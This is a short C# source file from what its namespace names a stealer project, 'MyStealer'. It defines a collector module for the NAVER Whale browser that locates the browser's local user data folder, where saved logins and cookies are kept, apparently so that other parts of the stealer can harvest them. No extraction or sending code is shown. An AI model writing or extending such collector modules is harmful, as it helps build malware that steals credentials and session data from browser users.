using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class NaverWhale : Chromium
    {
        public override string Name => "NAVER Whale";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Naver", "Naver Whale", "User Data");
    }
}
